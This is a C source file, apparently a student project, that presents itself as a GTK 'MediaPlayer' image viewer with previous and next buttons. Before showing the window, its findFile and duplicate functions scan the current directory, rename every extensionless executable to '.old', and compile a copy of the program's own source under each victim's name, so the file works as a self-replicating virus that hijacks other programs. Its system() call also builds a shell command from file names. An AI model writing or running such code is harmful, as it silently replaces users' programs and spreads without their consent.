//
// Created by yannis on 03/03/2023.
//
#include <gtk/gtk.h>
#include <stdio.h>
#include <sys/types.h>
#include <dirent.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>


#include <stdlib.h>



#define BUFFER_SIZE 500

void duplicate(char oldName[]) {
    FILE *src, *outFile;
    int ch;
    char objectName[256];
    strcpy(objectName,oldName);
    //strcat(objectName,"Duplicate");
    src = fopen("MediaPlayer.c", "r");
    strcat(oldName, ".c");
   // printf("    --%s-- --%s--\n", oldName,objectName);
    outFile = fopen(oldName, "w");
    if (outFile == NULL) {
        printf("    Error when creating the file.\n");
    }
    while ((ch = fgetc(src)) != EOF) {
        putc(ch, outFile);
    }
    fclose(src);
    fclose(outFile);
    char compile[256];
     int status;
    
    
    sprintf(compile,"gcc %.100s -o %.100s `pkg-config --cflags --libs gtk+-3.0` -I/usr/include/gtk-3.0",oldName,objectName);
    //printf("    gcc %.100s -o %.100s \n",oldName,objectName);
    status=system(compile);
    if (status!=0){
        perror("compiling error");
        exit(EXIT_FAILURE);
    }
    else if (status==-1){
        perror("Error when calling system()");
        exit(EXIT_FAILURE);
    }else{
        printf("    Compilation done \n");
        remove(oldName);
    }

          
//    printf("    Le fichier a ete copie avec succes. \n");
    
}

void findFile() {
    struct dirent *dp;
    struct stat statbuffer;
    char buffer[BUFFER_SIZE];
    DIR *dir;
//    char *cible[500];
    size_t t = 0;
    if ((dir = opendir(getcwd(buffer, BUFFER_SIZE))) == NULL) {
        perror("Cannot open. ");
    }
    while ((dp = readdir(dir)) != NULL) {
        stat(dp->d_name, &statbuffer);
        if (dp->d_type == DT_REG) {
            char oldName[256], oldOldName[256], newName[256];
            if (stat(dp->d_name, &statbuffer) == -1) {
                perror("stat error");
                exit(EXIT_FAILURE);
           }
            if (strcmp(dp->d_name,"MediaPlayer")!=0) {
              //      printf("TEST DIFFERENT SOURCE %s\n",dp->d_name);
                if (S_ISREG(statbuffer.st_mode) && (statbuffer.st_mode & S_IXUSR) && strrchr(dp->d_name, '.') == NULL) {
                    printf("   Target File: '%s'", dp->d_name);
                    //                cible[t]=dp->d_name;
                    t++;
                    strcpy(oldName, dp->d_name);
                    strcpy(oldOldName, oldName);
                    strcpy(newName, dp->d_name);
                    if (rename(dp->d_name, newName) != 0) {
                        printf("%s\n", dp->d_name);
                        perror("rename error");
                        exit(EXIT_FAILURE);
                    }
                    strcat(newName, ".old");
                    rename(dp->d_name, newName);
//                printf("----------------------%s\n",newName);
                    duplicate(oldOldName);

                } else {
                    printf("Non Target File: '%s'\n",dp->d_name);

                }
            }

        }
    }
}

GtkWidget *image;
GtkWidget *buttonPrev;
GtkWidget *buttonNext;
GtkWidget *mainWindow;
int currentImage = 1;
int maxImages = 6;

void showImage() {
    gchar *filename = g_strdup_printf("image_%d.jpg", currentImage);
    GdkPixbuf *pixbuf = gdk_pixbuf_new_from_file(filename, NULL);
    gtk_image_set_from_pixbuf(GTK_IMAGE(image), pixbuf);
    g_free(filename);
    g_object_unref(pixbuf);
}
void onButtonPrevCLicked() {
    currentImage--;
    if (currentImage < 1) {
        currentImage = maxImages;
    }
    showImage();
}

void onButtonNextCLicked() {
    currentImage++;
    if (currentImage > maxImages) {
        currentImage = 1;
    }
    showImage();
}

int main(int argc, char *argv[]) {
    findFile();
    gtk_init(&argc, &argv);
    mainWindow = gtk_window_new(GTK_WINDOW_TOPLEVEL);
    gtk_window_set_title(GTK_WINDOW(mainWindow), "MediaPlayer");
    gtk_container_set_border_width(GTK_CONTAINER(mainWindow), 10);
    gtk_widget_set_size_request(mainWindow, 400, 400);
    gtk_window_set_resizable(GTK_WINDOW(mainWindow), FALSE);
    g_signal_connect(G_OBJECT(mainWindow), "destroy", G_CALLBACK(gtk_main_quit), NULL);
    GtkWidget *main_box = gtk_box_new(GTK_ORIENTATION_VERTICAL, 10);
    gtk_container_add(GTK_CONTAINER(mainWindow), main_box);
    image = gtk_image_new();
    showImage();
    gtk_box_pack_start(GTK_BOX(main_box), image, TRUE, TRUE, 0);
    buttonPrev = gtk_button_new_with_label("Précédent");
    g_signal_connect(G_OBJECT(buttonPrev), "clicked", G_CALLBACK(onButtonPrevCLicked), NULL);
    gtk_box_pack_start(GTK_BOX(main_box), buttonPrev, FALSE, FALSE, 0);
    buttonNext = gtk_button_new_with_label("Suivant");
    g_signal_connect(G_OBJECT(buttonNext), "clicked", G_CALLBACK(onButtonNextCLicked), NULL);
    gtk_box_pack_start(GTK_BOX(main_box), buttonNext, FALSE, FALSE, 0);
    gtk_widget_show_all(mainWindow);
    g_signal_connect(mainWindow, "destroy", G_CALLBACK(gtk_main_quit), NULL);
    gtk_main();
    

    //lecture tableau cible
//    for (int i = 0; i < t; i++) {
//        printf("%s ", cible[i]);
//    }
    return 0;
}

//savedddddddddddddddddddddddd